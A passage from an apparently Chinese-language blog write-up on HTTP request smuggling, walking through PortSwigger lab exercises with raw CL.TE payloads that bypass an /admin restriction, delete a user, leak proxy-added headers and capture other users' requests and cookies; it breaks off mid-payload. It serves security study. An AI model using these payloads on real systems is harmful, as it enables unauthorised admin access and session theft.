&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;Transfer-Encoding: chunked\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;0\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#d88200">&amp;#39;\r\n&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8045ff">&lt;/span>&lt;span style="color:#111">|&lt;/span> nc -q3 127.0.0.1 &lt;span style="color:#ae81ff">8080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>某些中间件在解析块大小的时候，会将长度块大小长度进行截断，比如这里表现为只取&lt;code>'0000000000000000000000000000042&lt;/code>为&lt;code>00000000000000000&lt;/code>，这样就会认为这是两个请求了，第一个请求的块大小为0，第二个就会请求&lt;code>/tmp&lt;/code>，就导致了 HTTP Smuggling&lt;/p>
&lt;h4 id="http09">HTTP/0.9&lt;/h4>
&lt;p>HTTP/1.1&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /foo HTTP/1.1\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: example.com\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>HTTP/1.0&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /foo HTTP/1.0\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>HTTP/0.9&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">GET /foo\r\n
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>HTTP/0.9请求包与响应包是都没有 headers 的概念的，body是文本流形式，所以理所当然的尝试攻击&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319160208757.png" alt="image-20220319160208757">&lt;/p>
&lt;p>图中走私的部分并不是HTTP/0.9的标准格式但由于一些中间件虽然已经不支持直接解析HTTP/0.9的标准格式，但是还可能存在解析这种指定 HTTP version 的情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319161329950.png" alt="image-20220319161329950">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319161723973.png" alt="image-20220319161723973">&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI">视频演示-link&lt;/a>&lt;/p>
&lt;h3 id="实际用例">实际用例&lt;/h3>
&lt;h4 id="绕过前端安全控制">绕过前端安全控制&lt;/h4>
&lt;p>&lt;a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te&lt;/a>&lt;/p>
&lt;p>我们需要获取admin权限并删除carlos用户；直接访问/admin提示403，尝试smuggling&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /admin HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发送2次后回显Admin interface only available if logged in as an administrator, or if requested as localhost，我们在走私的部分加上localhost并更新CL长度&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">45&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /admin HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319173003409.png" alt="image-20220319173003409">&lt;/p>
&lt;p>得到删除carlos的api /admin/delete?username=carlos，继续修改payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">acf91f491f39aa83ca24ee71001b00aa.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">68&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /admin/delete?username=carlos HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: localhost
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一定注意\r\n数量和CL的大小&lt;/p>
&lt;h4 id="泄露代理服务器重写字段">泄露代理服务器重写字段&lt;/h4>
&lt;p>&lt;a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting&lt;/a>&lt;/p>
&lt;p>我们需要首先找出被前端服务器增加的字段，之后伪造本地请求并smuggling访问/admin并删除carlos账号&lt;/p>
&lt;p>要达到前者的目的，portswigger的解决方案是这样的&lt;/p>
&lt;ul>
&lt;li>找一个能够将请求参数的值输出到响应中的POST请求&lt;/li>
&lt;li>把该POST请求中，找到的这个特殊的参数放在消息的最后面&lt;/li>
&lt;li>走私这个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来&lt;/li>
&lt;/ul>
&lt;p>尝试前面的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">aca21f881e7fa688c0e81584004700af.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /admin HTTP/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>回显Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1，我们利用搜索回显将前端服务器转发的请求头泄露出来，这里第二部分的CL=70用来控制泄露字节的多少&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">aca21f881e7fa688c0e81584004700af.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">103&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>POST / HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 70
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>search=123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319181334902.png" alt="image-20220319181334902">&lt;/p>
&lt;p>发现前端服务器自动会加上&lt;code>X-XpZgRc-Ip&lt;/code>的请求头，如果我们直接加一样的内容会因为duplicate header names的原因而403，我们选择smuggling攻击将前端服务器多加的请求头隐藏掉&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">aca21f881e7fa688c0e81584004700af.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=VfYd3AGPB3TOUZNTRF2frj0c5kNJgBpw&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">75&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /admin HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-XpZgRc-Ip: 127.0.0.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>回显删除carlos的api /admin/delete?username=carlos&lt;/p>
&lt;h4 id="获取其它用户请求">获取其它用户请求&lt;/h4>
&lt;p>原理跟上面泄露字段大体相同，既然能得到中间件请求 我们也可以尝试得到其它用户的请求和cookie等&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ac951f7d1e9ea625803c617f003f005c.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">271&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
